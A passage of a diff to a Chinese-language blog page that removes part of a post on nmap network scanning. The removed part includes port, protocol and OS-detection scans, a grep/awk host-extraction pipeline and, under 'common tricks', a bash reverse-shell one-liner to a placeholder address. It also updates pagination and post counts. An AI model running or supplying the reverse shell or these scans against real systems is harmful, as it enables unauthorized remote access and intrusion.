class="line">nmap -sU 192.168.1.0/24 </div><div class="line"></div><div class="line">#确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)</div><div class="line">nmap -sO 192.168.1.19</div><div class="line"></div><div class="line">#探测目标主机的操作系统</div><div class="line">nmap -O 192.168.1.19 </div><div class="line">nmap -A 192.168.1.19 </div><div class="line"></div><div class="line">#进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)</div><div class="line">nmap -sP 192.168.1.0/24</div></pre></td></tr></table></figure>
-<p>上述是基本操作，配合grep、awk可以得到更为玄妙的结果</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#扫描指定网段的指定端口，并输出至ip.data</div><div class="line">nmap -n --open -p 80 10.254.20.0/24 | grep -B3 &quot;80/tcp&quot;|grep &quot;report for&quot;|awk &apos;&#123;print $5&#125;&apos; &gt;&gt; ip.data</div></pre></td></tr></table></figure>
-<p>类似地，我们可以通过nmap的扫描结果，提取出需要的内容。</p>
-<h3 id="11、常用技巧"><a href="#11、常用技巧" class="headerlink" title="11、常用技巧"></a>11、常用技巧</h3><p>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<p>运行crontab</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">crontab cronfile</div></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2333,7 +2274,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">129</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2344,7 +2285,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2355,7 +2296,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2580,6 +2521,8 @@
 
 
   
+
+
 
 
 
